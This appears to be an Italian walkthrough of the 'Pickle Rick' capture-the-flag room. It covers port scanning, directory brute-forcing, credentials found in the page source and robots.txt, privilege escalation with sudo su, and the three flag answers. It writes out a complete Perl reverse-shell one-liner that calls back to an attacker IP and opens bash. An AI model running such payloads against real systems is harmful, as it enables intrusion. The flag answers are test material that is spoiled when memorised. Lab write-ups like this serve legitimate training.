#  Pickle Rick

_Difficoltà: Easy_
_________________

#  Task 1 - Pickle Rick

- sudo nmap -p- --open -sC -sV -sS -A -T 5 -Pn -oN scan_pickle.txt TARGET-IP

![Istantanea_2023-08-05_17-20-30](https://github.com/Manganaccio/Manganaccio/assets/137283468/b0671aa8-bd4a-4af2-9a30-91cf0f6c35ad)

- essendo aperta la porta 80 si può visitare la pagina web, una volta visitata esaminare il codice sorgente della stessa, viene fornita un username, manca a questo punto una password ed una pagina di login

![Istantanea_2023-08-05_17-19-18](https://github.com/Manganaccio/Manganaccio/assets/137283468/259037d1-74af-4e30-a989-0410973aed80)

- usare gobuster per trovare le directories nascoste e aggiungendo il comando _-x php_ in modo da trovare eventuali pagine di login: gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/common.txt  -x php

![Istantanea_2023-08-06_09-07-38](https://github.com/Manganaccio/Manganaccio/assets/137283468/8486d2e6-e4e6-4424-82a2-10af685be615)

- visitando la pagina robots.txt si può ottenere una parola che presumibilmente sarà la password dell'username trovato in precedenza

 ![Istantanea_2023-08-05_17-21-44](https://github.com/Manganaccio/Manganaccio/assets/137283468/c2bbae57-8946-44ad-93c0-74a3f1ac815f)

- visitando la pgina login.php si potrà effettuare l'accesso con le credenziali trovate. Si verrà poi indirizzati ad una nuova pagina web dove si potrà eseguire il comando per ottenere la reverse shell:
  perl -e 'use Socket;$i="YOUR-IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
- in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel comando "perl")

# What is the first ingredient that Rick needs?

- una volta messi in comunicazione si può trovare il primo ingrediente nella directory /var/www/html

![Istantanea_2023-08-06_09-36-42](https://github.com/Manganaccio/Manganaccio/assets/137283468/74752716-7fb8-40b7-ad59-877b42e927dd)

    Answer: mr. meeseek hair

# What is the second ingredient in Rick’s potion?

- nella medesima directory del primo ingrediente c'è un altro file interessante demoninato _clue.txt_: Look around the file system for the other ingredient.
- navigando in home e successivamente nella cartella rick si trova il secondo ingrediente

![Istantanea_2023-08-06_09-38-48](https://github.com/Manganaccio/Manganaccio/assets/137283468/7b8841b0-25bc-476f-b64f-970ba538e2fb)

    Answer: 1 jerry tear

# What is the last and final ingredient?

- eseguendo il comando _sudo -l_ si nota che si possono scalare i privilegi eseguendo semplicente il comando: sudo su
- una volta diventati root navigare nella relativa cartella per trovare l'ultimo ingrediente

![Istantanea_2023-08-06_09-46-46](https://github.com/Manganaccio/Manganaccio/assets/137283468/270a464e-90ab-4144-b184-4f48ad496952)

    Answer: fleeb juice
